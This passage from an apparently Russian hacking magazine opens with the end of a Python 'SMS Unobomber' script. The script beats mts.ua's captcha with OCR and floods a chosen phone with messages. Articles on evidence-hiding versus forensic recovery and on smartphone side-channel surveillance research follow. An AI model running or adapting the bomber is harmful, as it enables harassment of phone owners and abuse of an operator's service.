     global SESSION
     global COOKIES
     try:
         r = SESSION.get(xURL, headers=headers,allow_redirects=True)
         if xparam==1:
             COOKIES=r.cookies
     except:
         print "[‐] Network errror !"
         sys.exit(0)
     if r.status_code != 200:
         print "[‐] Server errror",r.status_code
         sys.exit(0)
     return r.content
 # ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
 def get_captcha():
     n_try=1
     xlen_=5
     while xlen_!=4:
         print "[*] Getting CAPTCHA from mts.ua, attempt number",
 n_try
         captcha_=get_url("http://www.mts.ua/?r=site/captcha&v=5981af
 f096f17&widgetId=messager&width=315&height=242&backColor=0xffffff&
 foreColor=0xff0000",0)
         print "[+] Captcha downloaded"
         write_to_file("xcaptcha.png",captcha_)
         print "[+] Captcha saved to xcaptcha.png"
         d_captcha=pytesseract.image_to_string(Image.open('xcaptcha.
 png'), lang='eng', config = tessdata_dir_config)
         xlen_=len(d_captcha)
         try:
             z=int(d_captcha)
         except Exception as e:
             xlen_=5
         if xlen_!=4:
             print "[‐] OCR is no good:",d_captcha
         n_try=n_try+1
     print "[!] Well done OCR is good:",d_captcha
     return d_captcha
 # ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
 def get_csrf():
     xhtml=get_url("http://www.mts.ua/ru/online‐services/send‐sms/",1
 )
     xs=xhtml.find("var csrfToken = '")
     xl=len("var csrfToken = '")
     csrf_=xhtml[xs+xl:xs+xl+40]
     return csrf_
 # ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
 def send_sms(csrf,captcha,xnet,xnumber,xsms):
     global SESSION
     global COOKIES
     xcaptcha=str(captcha)
     xdata={'YII_CSRF_TOKEN':csrf,'widgetId':'messager','MessageForm[
 network]':xnet,'MessageForm[phone]':xnumber,'MessageForm[encoding]':
 'cyrilic','MessageForm[is_translit]':'0','MessageForm[message]':xsms
 ,'MessageForm[verifyCode]':xcaptcha}
 r = SESSION.post(url="http://www.mts.ua/ru/online‐services/send‐sms/
 ", headers=headers, data=xdata, cookies=COOKIES)
     zhtml=r.content
     sms_status=zhtml.find("<div class=\"response‐message\">")
     if sms_status!=‐1:
         print "[+] SMS Status: Sent OK"
         return 1
     else:
         print "[‐] SMS Status: Sent BAD"
         return 0
 # ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
 os.system("cls")
 print "‐=[Vodafone SMS Unobomber v 0.1]=‐"
 SESSION=requests.Session()
 sms_text=raw_input("Enter SMS message: ").decode(sys.stdin.encoding
 or 'utf‐8')
 xnetwork=raw_input("Enter mobile network(38050;38066;38095;38099): "
 )
 xnumber=raw_input("Enter mobile number(in format XXX‐XX‐XX): ")
 number_of_sms=int(raw_input("Enter number of SMS's(1..XXX): "))
 goods_=0
 bads_=0
 totals_=number_of_sms
 XCSRF=get_csrf()
 print "[+] YII_CSRF_TOKEN =",XCSRF
 while number_of_sms>0:
     CAPTCHA=get_captcha()
     print "[*] Sending SMS ..."
     xresult=send_sms(XCSRF,CAPTCHA,xnetwork,xnumber,sms_text)
     if xresult==1:goods_=goods_+1
     if xresult==0:bads_=bads_+1
     number_of_sms=number_of_sms‐1
     time.sleep(2)
 print "‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐"
 print "[!] Total:",totals_,"; Goods:",goods_,"; Bads:",bads_
 # ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
ВЗЛОМ
НАИВНЫЕ
ПРЕСТУПНИКИ

КАК ОБЫВАТЕЛИ
ПРЯЧУТ
ЦИФРОВЫЕ
УЛИКИ





      Олег Афонин
   Эксперт по мобильной
 криминалистике компании
       «Элкомсофт»
 aoleg@voicecallcentral.com





Большинство преступников — далеко не профессионалы,
поэтому и используемые ими способы сокрытия дан ных
наивны. И тем не менее эти способы в массе своей сра‐
батывают — просто потому, что у сле дова теля может не быть
времени или достаточной квалификации для того, чтобы
провести качес твен ный ана лиз. Какие же способы исполь‐
зуют среднестатистический Джон и среднестатистическая
Мэри, чтобы сокрыть улики? Набор уло вок невелик, а сами
уловки достаточно бесхитростны.


В  один  прекрасный  день  я  нас траивал  вложенный  криптоконтейнер,
защищенный аппаратным криптоключом, и пытал ся понять, как можно доб‐
раться до информации, если ключ выдернули из компьютера. В голове все
более четко фор мировался ответ: никак. В этот самый момент меня поп‐
росили прокомментировать документ — по сути, руководс тво полицейских
экспертов по поиску цифровых улик. Документ привел меня в такой восторг,
что, не спросив официального разрешения от его авторов, я решил написать
на его основе статью. Вло женные криптоконтей неры вместе с аппаратным
криптоключом отправились в сторону, а я сел изучать методы, которы ми,
по словам полицейских, большинс тво подследственных пытаются заметать
следы и скрывать улики.


ПЕРЕМЕЩЕНИЕ ДАННЫХ В ДРУГУЮ ПАПКУ
Нет, сейчас мы обсуждаем не «сокрытие» коллекции порнографических кар‐
тинок в папке «Курсовые по сопромату». Мы обсуждаем наивный, но дос‐
таточно действенный спо соб спрятать улики, прос то переместив определен‐
ные данные в другое место на диске.
   Что это, очевидная глупость или запредельное простодушие? Каким бы
наивным ни казался этот способ, он вполне может сработать для редких
и экзотических данных — таких как jump lists (кстати, а знаешь ли ты, что
это такое?) или база данных мессенджера WhatsApp. У эксперта может прос‐
то не найтись времени или достаточной целеустремленности, чтобы обша‐
ривать весь компьютер в поисках базы данных от... а от чего, собственно?
Программ для мгновенного обмена сооб щениями существу ет сотни, если
не тысячи; поди пой ми, какой из них пользовался преступник. И, заметь,
у каждого приложения сугубо собственные пути к файлам, име на и даже свои
форматы баз дан ных. Искать их вручную на компь ютере с десятками тысяч
папок и сотнями тысяч файлов — занятие бес перспективное.
  Очевидно, что такой способ сокрытия улик сра бота ет, исключительно если
расследуются преступления, не свя занные с информационной безопас‐
ностью. У следователя может не возникнуть вопросов по поводу содер‐
жимого жесткого диска подоз рева емо го, и его анализ превратится в фор‐
мальность. В таких и только таких случаях метод — назовем его «методом
Неуловимого Джо» — может сработать.


ИСПОЛЬЗОВАНИЕ «БЕЗОПАСНЫХ» МЕТОДОВ КОММУНИКАЦИИ
Этот пункт вызвал у меня особое восхищение. Современные прес тупники,
как ни странно, неплохо ориентируются в воп росах безопасности. Они
довольно хорошо представляют, каким образом передаются сообщения
между участниками чата, где они сохраняются и как их удалять.
  В документе подробно описываются воз можнос ти, которыми может вос‐
пользоваться следствие для того, чтобы все‐таки получить доступ к чатам.
Здесь и исследование областей freelist баз данных в формате SQLite, и офи‐
циальные запросы к производителям мес сенджеров (например, Microsoft
без лишних вопросов отдаст следс твию логи бесед в Skype — ведь хранятся
они на серверах компании), и даже запросы к производителям смартфонов
(здесь вспоминается история, в которой компания BlackBerry помогла канад‐
ской полиции локализовать банду наркоторговцев, решивших воспользовать‐
ся фирменным мессенджером компании на ста рой платформе BlackBerry
OS).
  В этой связи на ум приходит курь езный случай, о котором я услы шал
на полицейском мероприятии. Американская полиция задержала человека,
подозревавшегося в наркоторговле в особо крупных размерах. Подозрева‐
емый был неплохо подкован техничес ки и в качестве единственного метода
общения выбрал Apple iMessage. Сообщения iMessage не сохраняются
на серверах Apple, а подозрева емый тщательно очищал историю переписки
после каждой сессии. В резервной копии его iPhone не обнаружилось ничего
интересного.
  Однако, когда полиция взялась за исследование его компьютера (у прес‐
тупника был Mac), их радос ти не было предела: на компьютере нашлись сот‐
ни тысяч (!) сообщений, о самом существо вании которых прес тупник (теперь
уже точно преступник) вовсе не подозревал. Осудить наркоторговца помогла
новинка (на тот момент) от Apple — система Continuity, которая синхронизи‐
ровала сообщения iMessage между всеми устрой ствами, зарегистрирован‐
ными в одной учетной записи.
  К слову, докладчик жаловался, что все существовавшие на тот момент
программы для анализа баз данных iMessage не справлялись с таким
количеством сооб щений и попросту падали; полиции пришлось писать собс‐
твенную утилиту для парсинга разбухшей БД.
  Мораль? Морали здесь нет: если ты не специалист в IT, знать о подобных
моментах невозможно.


ПЕРЕИМЕНОВАНИЕ ФАЙЛОВ
Еще одна наивная попытка спрятать улики — переименование файлов.
Как бы просто это ни звучало, переименование, к примеру, зашифрованной
базы данных какого‐нибудь защищенного мес сенджера во что‐то вроде C:\
Windows\System32\oobe\en‐US\audit.mui вполне в состоянии пройти мимо
внимательного взгляда эксперта. Действительно, в каталогах Windows хра‐
нятся тысячи файлов; найти среди них что‐то необычное (особенно если оно
не выделяется размерами) — задача, ручным тру дом не решаемая.
   Каким образом ищут такие файлы? Наивному обывателю простительно
не знать о существовании целого класса специализированных программ,
предназначенных именно для поиска подоб ных файлов на дисках (и образах
дисков) подозреваемых. Используется отнюдь не только поиск по имени фай‐
ла; применяется комплексный подход, когда ана лизируются следы (нап‐
ример, в реестре Windows) уста новленных приложений, после чего отсле‐
живаются пути к файлам, к которым получали доступ эти приложения.
  Другой популярный способ поиска переименованных файлов —  так
называемый карвинг, или сквоз ной поиск по содержимому. В точности такой
же подход, иначе известный как «поиск по сигнатурам», использовался
с начала времен абсолютно во всех антивирус ных программах. При помощи
карвинга можно проанализировать как содержимое файлов на дис ке, так
и содержимое самого диска (или только занятых областей) на низком уровне.
   Стоит ли переименовывать файлы? Это — очередная хитрость «Неуло‐
вимого Джо», способ ная защитить лишь от очень ленивого следователя.


УДАЛЕНИЕ ФАЙЛОВ
Не уверен, насколь ко «наивно» на сегодняшний день пытаться скрыть улики,
удаляя файлы. Дело в том, что файлы, удален ные с обычных жестких дисков,
как правило, довольно легко восста навливаются при помощи уже хорошо
знакомого сигнатурного поиска: диск ска нируется поблочно (сейчас нас
интересуют фрагменты, не занятые сущес твующими файлами и прочими
структурами файловой системы), каждый про читанный блок данных анализи‐
руется на соответствие ряду критериев (является ли он заголовком файла
определенного формата, частью тексто вого файла и так далее). При помощи
такого сканирования, выполняемого, к слову, в пол ностью автоматическом
режиме, вероятность успешно го (хотя бы частичного) вос становления уда‐
ленных файлов достаточно велика.





  Криминалистическое ПО (на скриншоте — Belkasoft Evidence Center)
  умеет восстанавливать уда ленные данные, такие, например, как чаты
  скайпа, с помощью глубокого анализа баз SQLite

Казалось бы, удаление файлов — классичес кая «наивная» попытка спря тать
улики. Но только не когда файлы уда ляют ся с SSD‐дис ков.
   Здесь нужно рассказать чуть подробнее о том, как работает удаление (и
последующее чтение) данных на SSD. Наверняка ты слы шал о сущес твовании
«сборщика мусора» и функции TRIM, поз воляющих современным SSD под‐
держивать высокую производитель ность при записи (и особенно — переза‐
писи) данных. Команда TRIM подается операционной сис темой; она сооб‐
щает контроллеру SSD, что определен ные блоки данных с определенными
физическими  (на самом  деле  нет)  адресами  освобождены  и  более
не используются.
  Задача кон трол лера теперь — очис тить (произвести стирание данных)
указанные блоки, подготовив их таким обра зом для того, чтобы в них можно
было быстро записать новую информа цию.
  Но стирание данных — процесс очень медленный, и происходит он
в фоновом режиме, когда нагрузка на диск пада ет. А если сразу после коман‐
ды TRIM поступает команда записи в тот самый «физичес кий» блок? В этом
случае контроллер мгновенно подменя ет такой блок пустым, прос то модифи‐
цировав значение в таблице переадресации. А тот блок, который предназна‐
чен для стирания, получает дру гой «физический» адрес или вовсе помеща‐
ется в неадресуемый пул из резервной области.
  Вопрос на засыпку: а если контроллер не успел физически стереть данные
из TRIM’нутых блоков, сможет ли сигнатурный поиск найти что‐либо в свобод‐
ных областях SSD?
  Правильный ответ: в большинстве случаев при попытке считать данные
из блока, на который пос тупила команда TRIM, контрол лер выдаст либо нули,
либо другую последова тельность данных, ничего общего не имеющую
с реальным содержимым бло ка. Связано это с особенностя ми реализации
в современных SSD протоко лов, в которых четко определяется поведе ние
контроллера при попыт ке считать блок пос ле команды TRIM. Значений здесь
всего три: Undeﬁned (контроллер вер нет реальное содержимое блока; в сов‐
ременных SSD практически не встречается), DRAT (Determined Read After
Trim, или фиксированные данные после Trim; в потребительских моделях
встречается чаще всего) и DZAT (Determined Zeroes After Trim, или всегда воз‐
вращать нули после команды Trim; час то встречается в моделях, предназна‐
ченных для работы в составе RAID, NAS и в серверных сценариях).
   Таким образом, в подавляющем большинс тве слу чаев контроллер вернет
нам данные, не име ющие ничего общего с реальным содержимым накопи‐
теля. Восстановить удаленные файлы с SSD в большинстве случаев не удас‐
тся даже спустя секунды пос ле их удаления.


ХРАНЕНИЕ ДАННЫХ В ОБЛАКЕ
Данные — в облаке? Ты ска жешь, что нас толь ко глупых прес тупников уже
не осталось, и будешь не прав. Пользователи с завид ным постоянством
забывают отключить то iCloud Photo  Library, то синхронизацию OneDrive
или Google Drive, а то и более экзотические виды синхронизации — нап‐
ример, настройку (которой, кстати, в iOS вовсе нет; может, поэтому забыва‐
ют?), благодаря которой информация о звонках с iPhone (как по телефону, так
и через FaceTime) сразу попадает на серверы Apple. Примеры с «забытым»
режимом Continuity и мессенджером BlackBerry я уже приводил.
  Пожалуй, здесь мне нечего добавить, кроме того, что данные из облака
компании выдают полиции без осо бого сопротивления.


ИСПОЛЬЗОВАНИЕ ВНЕШНИХ НАКОПИТЕЛЕЙ
Использование зашифрованных флешек для хра нения информации, связан‐
ной с нелегальной деятельностью, кажется преступникам гениальной идеей.
Казалось бы, ничего не нужно уда лять — дос таточно выдернуть флешку
из компьютера, и доступ к данным не получит никто и никогда (если защита
стойкая). Именно так рассужда ют наивные преступники.
  Почему «наив ные»? Дело в том, что большинс тво прос тых пользователей
не имеет представления о «хвос тах», которые оста ются после практически
любых манипуляций с USB‐устройства ми. Так, однажды рассле довал ся слу‐
чай с распространением детской порногра фии. Преступники использовали
исключительно внешние накопители (обычные флешки); на дисках не хра‐
нилось ничего.
  Преступники не учли сра зу два момента. Первый: информация о под клю‐
чении USB‐устрой ств сохраняется в реес тре Windows; если ее не удалять, то
хранится она там очень и очень долго. И второй момент: если для доступа
к изображениям поль зовать ся встроенным в Windows проводником, то авто‐
матически создаются (и сохраня ются!) умень шенные превью фотографий
(thumbnails), обыч но по адресу %LocalAppData%\Microsoft\Windows\Ex‐
plorer\. Проанализировав умень шенные изображения и сопос тавив иден‐
тификаторы USB‐устройств с конфиско ванными, следствию удалось доказать
причастность обвиняемых к инкриминируемому прес туплению.
  А что же с шифрованием? И здесь не все очевидно. Во‐первых, сущес тву‐
ют специализированные приложения, поз воляющие создать дамп оператив‐
ной памяти компьютера и извлечь из него криптогра фические ключи, исполь‐
зующиеся для доступа к зашифрованным томам (в частности, к популярному
среди наив ных преступников BitLocker To Go). Пример такой программы —
Elcomsoft Forensic Disk Decryptor, при помощи которой можно проанализи‐
ровать дамп в пол ностью автоматичес ком режиме. А соз дать образ опе‐
ративной памяти можно при помощи бесплат ной утилиты Belkasoft RAM Cap‐
turer.





                            Belkasoft RAM Capturer

Во‐вторых, ни для кого не секрет, что мно гие криптоконтейнеры автоматичес‐
ки депонируют ключи шифрования в облако. И если Apple при активации File‐
Vault 2 несколько раз уведомит пользователя о том, что восстановление дос‐
тупа к разделу будет воз можно через iCloud, то Microsoft при шифровании
тома с использованием BitLocker Device Protection просто молча создает
депонированный ключ в учетной записи пользователя Microsoft Account. Клю‐
чи эти доступны непосредс твенно на странице акка унта пользователя.
   Как получить доступ к учетной записи? Если в компьюте ре настроен логин
при помощи Microsoft Account (а не локальной учетной записи Windows), то
офлайновая  атака  прямым  перебором  может  восстановить  пароль,
который — сюрприз! — будет совпадать с паролем от онлай новой учетной
записи Microsoft Account.


ВМЕСТО ЗАКЛЮЧЕНИЯ. ВЛОЖЕННЫЕ КРИПТОКОНТЕЙНЕРЫ С
АППАРАТНЫМ КЛЮЧОМ
Казалось  бы,  непробиваемая  защита.  Пионер  Вася  может  хихикать
и потирать ручки, уверенный, что уж теперь‐то его данные в пол ной безопас‐
ности.
   Теоретически — да. Практически… практичес ки — есть тонкости юри‐
дического плана. И вот яркий пример.
  Обвиняемый в скачивании и хранении детской порнографии находится
в заключении в американской тюрь ме вот уже два с лишним года. Официаль‐
ное обвинение — отказ подозреваемого выдать пароли от зашифрованных
внешних хранилищ (NAS), где, по мнению суда, хранится детская порногра‐
фия.
   Хранится она там или нет — неизвес тно; соот ветс твующего содержимого
у обвиняемого найдено не было. Но обвинение очень серьезное, а здесь
можно и пожертвовать такими мелочами, как презумпция невиновности
и право не свидетельство вать против самого себя. Так что обвиняемый сидит
и будет сидеть до тех пор, пока не раскроет пароли или не умрет от старости
или иных причин.
  Не так давно правозащитники подали апелляцию, в которой указывалось,
что по закону по данной статье (отказ от сотрудничества со следс твием) мак‐
симальный срок заключения — 18 месяцев. Апелляция была отклонена судом
несмотря на то, что судья признал аргументы адвоката «интерес ными и раз‐
носторонними». Обвинение посерь езнее — и судьи закроют глаза на что
угодно, вклю чая писаные законы.
  Все еще хочешь поиг рать с пра восу дием в прят ки? У меня нет для тебя
хороших новостей…



Выражаем благодарность Юрию Губанову, генеральному директору ком‐
пании «Белкасофт», поделившемуся интересными подробнос тями о несколь‐
ких недавно раскрытых случаях.
ВЗЛОМ



МОБИЛЬНАЯ
 ПАРАНОЙЯ
        10 НОВЫХ ФАКТОВ О ТОМ,
       КАК НОСИМЫЕ УСТРОЙСТВА
          СЛЕДЯТ ЗА ТОБОЙ





Вот уже двадцать пять лет хакеры неп‐
рерывно бьют тревогу: наша частная жизнь,
приватность, право на анонимность, право
на  конфиденциаль ность  переписки  ата‐
куются, и с каждым годом все интенсивнее.           Антон Карев                                                                                    Эксперт по информационной
Эпоха тотального контроля уже на пороге,       безопасности.высшее, специальностьОбразование
но большинс тво людей это не беспоко ит —      компьютерных«Защита информациисистемах»,в в
даже ошеломляющие откро вения Сноудена      настоящийнад диссертацией.момент работаетОбласть
                                                                                     профессиональных
широкими   мас сами   воспринимаются      интересов ‐ технологическая
                                                                                         разведка, аналитика в сфере
                                                                                      ИБ, искусственныйкак  обычный  проходной   скандальчик
                                                                                                     интеллект.
                                                                                              vedacoder@mail.ruот какого‐то парня. Что же оста ется нам,
хакерам? Информировать. На конферен‐
циях по безопас ности рассказыва ют о все
более изощренных угро зах — мы отобрали
десять  докладов,  которые  посвящены
новейшим веяниям в области мобильного
шпионажа.


1. ГИРОСКОП, КОТОРЫЙ ПРОСЛУШИВАЕТ
Источник: Gyrophone: Recognizing Speech From Gyroscope Signals
// Black Hat 2014
  Современные смартфоны оснащены мно жес твом сенсоров, которые поз‐
воляют реализовать богатый пользовательский интерфейс. В целом они
полезны, но иногда могут (непредна меренно, конечно) разглашать чувстви‐
тельную информацию. Риски конфиденциальности, связанные с такими сен‐
сорами, как микрофон, камера и GPS, очевидны и хорошо понятны, но ока‐
зывается, что и гироскоп с акселерометром тоже могут быть опасны, ведь
даже Java‐апплет на веб‐сайте может измерять и сохранять показатели этих
сенсоров.
  Чем это грозит? Доступ к гироскопу и акселеро метру поз воляет: иден‐
тифицировать поль зователя по шаблону его ходь бы (получаемому с аксе‐
лерометра смар тфона), считывать сим волы, введенные с клавиатуры, рядом
с которой лежит смар тфон, и даже прослушивать разговоры без дос тупа
к настоящему мик рофону — используя гирос коп в качес тве грубого мик‐
рофона. Подробная инс трукция о том, как все это сде лать, находится
в открытом доступе.


2. БАТАРЕЙКА, КОТОРАЯ СТУЧИТ
Источник: Battery Firmware Hacking // Black Hat 2011
   «Батарейка? Вы это серьезно? Парни, вы чего, при чем тут вообще акку‐
мулятор моего мобильника?» Ладно‐ладно, спокойно, начнем издалека. :) Ты
когда‐нибудь задумывался, как твоя батарейка из мобильника узнаёт, когда
ей прекратить зарядку, — если она подключена к сети, но мобильник вык‐
лючен? Дело в том, что современный аккумулятор име ет встроенный мик‐
рокомпьютер, общающийся  с  зарядным  устройством  и  мобильником.
Смарт‐аккумулятор, вернее встроенную в него «систему управле ния умной
батарейкой» (SBS), можно полностью перепрограммировать.
  Изначально такая возможность предус мотрена для того, чтобы SBS могла
более точно измерять параметры батарей ки и более адаптивно настраивать
алгоритм зарядки (в зависимос ти от химических и других характеристик).
Если злоумышленник сумеет изменить работу такого внутреннего мик‐
рокомпьютера, то это может привести к перегреву батарейки или даже к ее
возгоранию. Так же зло умышленник, завладевший доступом к микрокомпь‐
ютеру смарт‐аккумулятора, получит воз можность наб людать за доверенными
операциями с крипточипом смартфона (поскольку батарейка общается
с операционной системой по «доверенному каналу»).


3. СКАЖИ МНЕ, СКОЛЬКО ЭНЕРГИИ ПОТРЕБЛЯЕТ ТВОЙ
ТЕЛЕФОН… И Я СКАЖУ, ГДЕ ТЫ
Источник, инструк ция по эксплу атации: PowerSpy: Location Track-
ing using Mobile Device Power Analysis // 24th USENIX Security Sym-
posium. 2015. P. 785–800
  Современные мобильные платформы, такие как Android, позволяют при‐
ложениям  узнать совокупное потребление энергии на смартфоне. Эта
информация считается безвредной, и поэтому ее чтение не требует прав
привилегированного пользователя.
  Чем это грозит? Всего лишь считывая совокупное потребление энергии
смартфоном в течение нескольких минут, можно определить местополо‐
жение пользователя этого смартфона. Совокупные данные об энергопот‐
реблении телефона чрезвычайно шумны из‐за множества компонентов
и приложений, которые одновременно пот ребляют электроэнергию. Тем
не менее благодаря современным алгоритмам машинного обучения можно
их отсеять и успешно определить местополо жение смартфона. Подробная
инструкция о том, как это сделать, находится в открытом доступе.


4. WI-FI ЧИТАЕТ ПО ГУБАМ
Источник: We Can Hear You with Wi-Fi! // IEEE Transactions on Mo-
bile Computing. 2016. Vol. 15, № 11. P. 2907–2920
   Wi‐Fi‐сигналы могут «видеть» перемещение и мес тонахождение людей
и «слышать» их разговоры — даже тех, у которых нет с собой никакой элек‐
троники. Это становится воз можным благодаря продвинутым техникам ради‐
окартографирования: крупнозернистое ради окартографирование позволяет
«видеть», а мелкозернистое — даже и «слышать» (при чем одновременно сра‐
зу нескольких людей).
   Случай с Wi‐Fi‐видением более или менее ясен и поэтому не так инте‐
ресен. Что же касается «Wi‐Fi‐слышания», то здесь секрет в профилировании
движения ротовой полости. При этом Wi‐Fi‐сигнал улавливает характерное
положение не только губ, но и зубов и языка. Кроме того, поскольку ради‐
осигналы проходят через стены и другие физичес кие препятствия, Wi‐Fi
может «слышать» разговоры даже за стеной. Для это го Wi‐Fi‐сигналу только
надо найти рот человека, не спутав его при этом с мигающим глазом. Но эта
задача вполне решаемая. Подробная инс трукция о том, как приручить Wi‐Fi (с
применением машин ного обучения и вейвлет‐преобразований), находится
в открытом доступе.


5. ЭЛЕКТРОМАГНИТНОЕ ПОЛЕ — ТО ЕЩЕ ПАЛЕВО
Источник: A Reliability-Augmented Particle Filter for Magnetic Fin-
gerprinting Based Indoor Localization on Smartphone // IEEE Trans-
actions on Mobile Computing. 2015. Vol. 15, № 8. P. 1877–1892
   Indoor‐локализация  посредством фиксации смартфоном  электромаг‐
нитного поля (электро магнитных отпечат ков пальцев) — широко обсужда‐
емая технология последних лет. Она основана на том факте, что внутри раз‐
ных помещений магнитное поле отличается в зависимости от природных
и  искусственных  факторов:  конструктивных  особенностей  стального
или железобетонного каркаса, конс труктивных особенностей электрической
сети и так далее.
   Таким образом, у каждого помещения есть свой уникальный элек тро-
магнитный отпе чаток. Соответс твующие профили магнитного поля могут
использоваться в качестве отпечатков пальцев для indoor‐локализации. Элек‐
тромагнитная  indoor‐локализация пос тепенно вытесняет  Wi‐Fi‐радиокар‐
тографирование, поскольку менее энергозатратна. Ведь для фиксации элек‐
тромагнитного поля ничего, кро ме смартфо на, не нужно. А генерировать
это поле не требуется — оно уже есть. Тогда как при Wi‐Fi‐радиокартогра‐
фировании необходимо наличие нес кольких приемников и передатчиков Wi‐
Fi‐сигнала.

Кри тичес кий ком мента рий от 84ckf1r3
Чаще всего описанным выше методам для практичес кой реализации не хва‐
тает точности. Им противос тоят сильные помехи, низ кая частота дискретиза‐
ции и другие физические огра ничения. Методы машинного обучения и филь‐
трации тоже не всесильны. Нап ример, сейчас при помощи анализа рас‐
пространения сигналов от разных точек дос тупа Wi‐Fi можно определить чис‐
ло движущихся людей за стенкой. Неподвижные люди часто сливаются
с мебелью. Оценить рост обна руженных таким образом людей можно очень
приблизительно, а их артикуляцию — невоз можно физически. Не хватит раз‐
решающей способности.
  Система управле ния батарейкой слишком примитивна, чтобы заставить
ее скомпрометировать криптографические клю чи смартфона. Все‐таки мик‐
роконтроллер — это не универ сальный микропроцессор, который теоре‐
тически можно заставить выполнить любой набор команд.
  Иначе говоря, вывести все это за рамки proof‐of‐concept крайне затрудни‐
тельно — «Математическая теория свя зи» и дру гие кни ги Шеннона как бы
намекают нам, что нель зя вос ста новить слож ный сигнал (с высокой энтро‐
пией и частотой) по анализу побочных прос тых сигналов. Например, по сту ку
колес поезда можно получить пример ное представление о его скорости,
но нельзя узнать, какую радиостанцию слушает пас сажир из третьего купе
в пятом вагоне, каково содержимое его багажа и есть ли он вообще.



6. RFID-МАЯЧКИ — СТАРАЯ УГРОЗА НА НОВЫЙ ЛАД
Источник: Extreme-range RFID tracking // Black Hat 2010
  Ни для кого не секрет, что RFID, эти крошечные компьютерные чипы,
которые теперь имеют размеры мень ше песчинки, — одно сплошное палево.
Как тебе нравятся грабители, которые гуляют в центре города со сканером
и ищут чипированные документы граж дан из богатых стран, чтобы их огра‐
бить? А ведь это уже реальность, поскольку при помощи недорогого спе‐
цоборудования RFID можно считывать с расстояния в двадцать метров.
   Хозяева торговых сетей тоже могут почувство вать себя в числе первых
скрипок на празднике тотального шпионажа, ведь у них на руках есть все воз‐
можности тебя мониторить — благода ря RFID‐маячку каждый экземпляр
товара имеет уникальный идентификатор. Этот идентификатор может быть
легко связан с покупателем. Например, для определе ния «частого покупа‐
теля» при сканировании его кредитки.
   RFID‐чипы могут быть считаны с расстояния, прямо через одежду, кошелек
или рюкзак — без тво его ведома и согласия. Мы, потребите ли, не можем
знать, в каких продуктах есть эти чипы, а в каких нет. RFID‐чипы могут быть
хорошо спрятаны. Например, они могут быть зашиты в швы одежды, рас‐
положены между сло ями картона, отлиты в пластмас се или резине, интегри‐
рованы в дизайн потребительской упа ковки. Кроме  того, необходимая
для работы этих чипов антенна сейчас может просто печататься проводя‐
щими чернилами, что делает RFID‐чипы практичес ки незаметными. Некото‐
рые компании даже экспериментиру ют с дизайном упаковки, которая сама
по себе будет антенной.
  В итоге в скором времени у потребителя не будет возможности узнавать,
есть ли в приобретаемом им товаре RFID‐маячок или нет.


7. УЛЬТРАЗВУКОВОЙ ЗАГОВОР: UBEACONS
Источник: Talking Behind Your Back. Attacks & Countermeasures
of Ultrasonic Cross-Device Tracking // Black Hat 2016
  Экосистема ультраз вукового отслежива ния (uBeacons) — относительно
новая технология, которая использует аудиомаячки, не слышимые человечес‐
ким  ухом, для отсле живания пользователей и устройств. uBeacons —
это высокочастотные аудиомаячки, излучение которых фиксиру ется боль‐
шинством коммерческих динамиков и микрофонов. Этот ультразвук — святой
Грааль маркетологов, пос кольку поз воляет отслеживать действия поль‐
зователей на разных устройствах.
  Например, зная, что дядя Вася только что пос мотрел телевизионное объ‐
явление и сейчас уже сидит в интернете со сво его смартфона (чтобы найти
подарок на день рождения), рекламодатель может показывать релевантную
контекстную рек ламу. uBeacons могут быть встроены в веб‐сайты или телеви‐
зионные объявле ния и могут быть собраны рекламными SDK, встроенными
в приложения смартфонов. Особо любимое маркетологами пре имущество
uBeacons — эта технология дает высокую точность нацеливания объ явлений,
не требуя от поль зователя каких‐либо действий. Однако для этого необ‐
ходимо, чтобы на мобильном устройстве пользователя был установлен uXDT‐
фреймворк. Суть работы uXDT‐фреймворка заключа ется в том, что в мобиль‐
ные приложения встраивают соответс твующие аудиомаячки — чтобы следить
за тем, что пользователь делает.
  При этом разработчик мобильного приложения даже может не знать, что
такой маячок спрятался в его проекте. Такое может произойти, например,
когда он при разработке программного обес печения пользовался «бес плат‐
ным SDK», где разработчик этого SDK ради дохода встроил ультразвуковой
модуль в свою библиотеку. Рекламодатели исполь зуют uXDT для таргетинга
пользователей следующим обра зом.
 1. Сначала рекламодатель запус кает объявление с эле ментами ультразвука:
   либо на TV, либо на сайте.
 2. Как только объявление отображается, из динамика устройства издается
   короткая последователь ность высокочас тотных (то есть ультразвуковых)
   тонов. Этот высокочастотный тон немедленно захватывается uXDT‐фрей‐
  мворком на смартфоне пользователя.
 3. Чтобы обеспечить такую функциональность, uXDT‐фреймворк работает
   в фоновом режиме и периодичес ки обра щается к микрофону устройства
   для прослушивания ультраз вуковых сигналов.

После того как такой сигнал зафиксирован, uXDT‐фреймворк извлекает
из него уникальный идентификатор объявления и сообщает об этом рек‐
ламодателю — вместе с уникальными идентификационными данными устрой‐
ства и пользователя. Рекламода тель затем исполь зует эту информацию, что‐
бы выявить инте ресы и предпочтения пользователя, и в соответствии с этим
делает ему индивидуальное рекламное предложение: направляет целевую
рекламу на устрой ство пользователя.


8. ВРАГ ИЗ ХОЛОДИЛЬНИКА (И КНИЖНОЙ ПОЛКИ)
Источник: Supermarket Cards: The tip of the retail surveillance Ice-
